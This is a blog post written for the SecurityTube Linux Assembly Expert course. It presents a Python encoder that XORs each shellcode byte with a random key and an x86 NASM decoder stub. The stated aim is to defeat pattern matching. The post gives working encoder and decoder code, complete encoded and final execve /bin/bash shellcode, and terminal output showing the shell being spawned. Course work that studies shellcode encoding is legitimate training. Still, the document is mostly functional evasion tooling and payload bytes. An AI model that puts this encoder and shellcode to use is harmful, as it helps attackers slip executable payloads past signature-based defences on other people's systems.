---
layout: post
title: "SLAE Assignment #4 | Shellcode encoder"
date: 2015-10-24
comments: true
categories:
---

This post is about writing an encoder in Python for x86 assembly and 
a decoder in x86 NASM.

The encoding technique used is as following:

```
Given n bytes to encode

for each byte generate a random number 0 < and <256
XOR the byte with the randomized number
append the xor'd value and the random number in an array 
where the xor'd value comes first and the random number after
for all other bytes do same operations
```

I've visualised an example in the following gif:

![encoder](/images/encoder.gif)

## Motivation

Compared to an normal XOR decoder where there are an finite number of 
variations of the encoded shellcode this encoding scheme offers a very 
high variation. More exactly there are atleast 255 to the power of n possible 
combinations of the shellcode (depending on how you count) , where n are the number of input bytes.
This means it will be hard to pattern match the encoded shellcode 
while the decoding part still is possible to easily pattern match.

## The encoder code:

```python
import random,sys

random.seed()

sys.argv[1] = sys.argv[1].replace('x','')
sys.argv[1] = sys.argv[1].replace('\\','')
shellcode = bytearray(sys.argv[1].decode('hex'))

#Randomized value to xor byte with
def randXOR():
	return random.randint(1,255)

encoded = ""

encoded2 = ""

for byte in shellcode:
	#We dont want an encoded byte resulting in null
	randVal = randXOR()
	while (randVal^byte) == 0:
		randVal = randXOR()

	print "Byte is: %x xor   \t with:%d \t encoded value: %x" % (byte,randVal,byte^randVal)
	byte ^= randVal #XOR byte with randomized randVal

	#PY version
	#First XOR'd byte from shellcode
	encoded += '\\x'
	encoded += '%02x' % byte
	
	#Second value is randomized XOR value to restore byte
	encoded += '\\x'
	encoded += '%02x' % randVal

	#NASM version
	encoded2+= '0x%02x,' % byte
	encoded2+= '0x%02x,' % randVal

print "\nGiven shellcode size (bytes): %d\nOutput shellcode size (bytes): %d\n" % (len(shellcode),len(encoded)/4)

print "Generated shellcode python/c style:"
print encoded+"\n"
print "Generated shellcode nasm style:"
print encoded2
```

Running example with some verbose output for the interested, input is an execve /bin/bash shellcode:

```bash
root@kali:~/Desktop/SLAE/assignment-4# python encoder.py \x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
Byte is: 31 	xor 	 with:189 	 encoded value: 8c
Byte is: c0 	xor 	 with:237 	 encoded value: 2d
Byte is: 50 	xor 	 with:23 	 encoded value: 47
Byte is: 68 	xor 	 with:83 	 encoded value: 3b
Byte is: 62 	xor 	 with:198 	 encoded value: a4
Byte is: 61 	xor 	 with:135 	 encoded value: e6
Byte is: 73 	xor 	 with:32 	 encoded value: 53
Byte is: 68 	xor 	 with:251 	 encoded value: 93
Byte is: 68 	xor 	 with:19 	 encoded value: 7b
Byte is: 2f 	xor 	 with:252 	 encoded value: d3
Byte is: 2f 	xor 	 with:63 	 encoded value: 10
Byte is: 2f 	xor 	 with:85 	 encoded value: 7a
Byte is: 2f 	xor 	 with:105 	 encoded value: 46
Byte is: 68 	xor 	 with:157 	 encoded value: f5
Byte is: 2f 	xor 	 with:60 	 encoded value: 13
Byte is: 62 	xor 	 with:106 	 encoded value: 8
Byte is: 69 	xor 	 with:48 	 encoded value: 59
Byte is: 6e 	xor 	 with:98 	 encoded value: c
Byte is: 89 	xor 	 with:200 	 encoded value: 41
Byte is: e3 	xor 	 with:146 	 encoded value: 71
Byte is: 50 	xor 	 with:30 	 encoded value: 4e
Byte is: 89 	xor 	 with:227 	 encoded value: 6a
Byte is: e2 	xor 	 with:26 	 encoded value: f8
Byte is: 53 	xor 	 with:211 	 encoded value: 80
Byte is: 89 	xor 	 with:111 	 encoded value: e6
Byte is: e1 	xor 	 with:9 	 encoded value: e8
Byte is: b0 	xor 	 with:247 	 encoded value: 47
Byte is: b 		xor 	 with:218 	 encoded value: d1
Byte is: cd 	xor 	 with:190 	 encoded value: 73
Byte is: 80 	xor 	 with:185 	 encoded value: 39

Given shellcode size (bytes): 30
Output shellcode size (bytes): 60

Generated shellcode python/c style:
\x8c\xbd\x2d\xed\x47\x17\x3b\x53\xa4\xc6\xe6\x87\x53\x20\x93\xfb\x7b\x13\xd3\xfc\x10\x3f\x7a\x55\x46\x69\xf5\x9d\x13\x3c\x08\x6a\x59\x30\x0c\x62\x41\xc8\x71\x92\x4e\x1e\x6a\xe3\xf8\x1a\x80\xd3\xe6\x6f\xe8\x09\x47\xf7\xd1\xda\x73\xbe\x39\xb9

Generated shellcode nasm style:
0x8c,0xbd,0x2d,0xed,0x47,0x17,0x3b,0x53,0xa4,0xc6,0xe6,0x87,0x53,0x20,0x93,0xfb,0x7b,0x13,0xd3,0xfc,0x10,0x3f,0x7a,0x55,0x46,0x69,0xf5,0x9d,0x13,0x3c,0x08,0x6a,0x59,0x30,0x0c,0x62,0x41,0xc8,0x71,0x92,0x4e,0x1e,0x6a,0xe3,0xf8,0x1a,0x80,0xd3,0xe6,0x6f,0xe8,0x09,0x47,0xf7,0xd1,0xda,0x73,0xbe,0x39,0xb9,
```

## The decoding step

The decoding process is quite straightforward, and is most easily 
described in a compact form, compared to the encoding step above:

```
Given n bytes to decode in array D
let writeIndex = 0
let readIndex = 0

while readIndex < n:
	let r1 = D[readIndex]
	let r2 = D[readIndex+1]
	D[writeIndex] = r1 XOR r2
	readIndex+=2
	writeIndex+=1
```

The actual code, with the shellcode encoded in the above step used:

```nasm
global _start

section .text

_start:
	jmp short call_shellcode
	
decoder:
	;esi is base of shellcode array
	pop esi	
	;let ecx be index for where to place read byte
	xor ecx, ecx
	;edx is the index for read byte
	xor edx, edx
	;eax used for short time saving of read byte
	xor eax, eax
decode:
	;Read instruction byte
	mov al, byte [esi+edx]
	;Read byte to xor with
	inc dl
	xor al, byte[esi+edx]
	;increment counter for read byte
	inc dl

	;Write byte in correct location and increment counter
	mov [esi+ecx], al 
	inc ecx
	
	;While edx<shellcodelength, go for loop
	cmp edx, ShellcodeLength
	jb decode
	
	jmp short EncodedShellcode

call_shellcode:
	call decoder

EncodedShellcode: db 0x8c,0xbd,0x2d,0xed,0x47,0x17,0x3b,0x53,0xa4,0xc6,0xe6,0x87,0x53,0x20,0x93,0xfb,0x7b,0x13,0xd3,0xfc,0x10,0x3f,0x7a,0x55,0x46,0x69,0xf5,0x9d,0x13,0x3c,0x08,0x6a,0x59,0x30,0x0c,0x62,0x41,0xc8,0x71,0x92,0x4e,0x1e,0x6a,0xe3,0xf8,0x1a,0x80,0xd3,0xe6,0x6f,0xe8,0x09,0x47,0xf7,0xd1,0xda,0x73,0xbe,0x39,0xb9
ShellcodeLength equ $-EncodedShellcode
```

Compile and run:

```bash
root@kali:~/Desktop/SLAE/assignment-4# ../tools/compile.sh decoder
Done
root@kali:~/Desktop/SLAE/assignment-4# ./decoder 
root@kali:/root/Desktop/SLAE/assignment-4# exit
exit
```

Running in shellcode format and showing that an actual shell is spawned:

```bash
root@kali:~/Desktop/SLAE/assignment-4# ../tools/format_shellcode.py decoder
Python style shellcode:
\xeb\x1c\x5e\x31\xc9\x31\xd2\x31\xc0\x8a\x04\x16\xfe\xc2\x32\x04\x16\xfe\xc2\x88\x04\x0e\x41\x83\xfa\x3c\x72\xed\xeb\x05\xe8\xdf\xff\xff\xff\x8c\xbd\x2d\xed\x47\x17\x3b\x53\xa4\xc6\xe6\x87\x53\x20\x93\xfb\x7b\x13\xd3\xfc\x10\x3f\x7a\x55\x46\x69\xf5\x9d\x13\x3c\x08\x6a\x59\x30\x0c\x62\x41\xc8\x71\x92\x4e\x1e\x6a\xe3\xf8\x1a\x80\xd3\xe6\x6f\xe8\x09\x47\xf7\xd1\xda\x73\xbe\x39\xb9

NASM stylish:
0xeb,0x1c,0x5e,0x31,0xc9,0x31,0xd2,0x31,0xc0,0x8a,0x04,0x16,0xfe,0xc2,0x32,0x04,0x16,0xfe,0xc2,0x88,0x04,0x0e,0x41,0x83,0xfa,0x3c,0x72,0xed,0xeb,0x05,0xe8,0xdf,0xff,0xff,0xff,0x8c,0xbd,0x2d,0xed,0x47,0x17,0x3b,0x53,0xa4,0xc6,0xe6,0x87,0x53,0x20,0x93,0xfb,0x7b,0x13,0xd3,0xfc,0x10,0x3f,0x7a,0x55,0x46,0x69,0xf5,0x9d,0x13,0x3c,0x08,0x6a,0x59,0x30,0x0c,0x62,0x41,0xc8,0x71,0x92,0x4e,0x1e,0x6a,0xe3,0xf8,0x1a,0x80,0xd3,0xe6,0x6f,0xe8,0x09,0x47,0xf7,0xd1,0xda,0x73,0xbe,0x39,0xb9
root@kali:~/Desktop/SLAE/assignment-4# ../tools/runShellcode.py '\xeb\x1c\x5e\x31\xc9\x31\xd2\x31\xc0\x8a\x04\x16\xfe\xc2\x32\x04\x16\xfe\xc2\x88\x04\x0e\x41\x83\xfa\x3c\x72\xed\xeb\x05\xe8\xdf\xff\xff\xff\x8c\xbd\x2d\xed\x47\x17\x3b\x53\xa4\xc6\xe6\x87\x53\x20\x93\xfb\x7b\x13\xd3\xfc\x10\x3f\x7a\x55\x46\x69\xf5\x9d\x13\x3c\x08\x6a\x59\x30\x0c\x62\x41\xc8\x71\x92\x4e\x1e\x6a\xe3\xf8\x1a\x80\xd3\xe6\x6f\xe8\x09\x47\xf7\xd1\xda\x73\xbe\x39\xb9'
root@kali:/root/Desktop/SLAE/assignment-4# ps
  PID TTY          TIME CMD
 3112 pts/0    00:00:00 bash
 5803 pts/0    00:00:00 bash
 5847 pts/0    00:00:00 ps
root@kali:/root/Desktop/SLAE/assignment-4# exit
exit
root@kali:~/Desktop/SLAE/assignment-4# ps
  PID TTY          TIME CMD
 3112 pts/0    00:00:00 bash
 5848 pts/0    00:00:00 ps
```

---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569
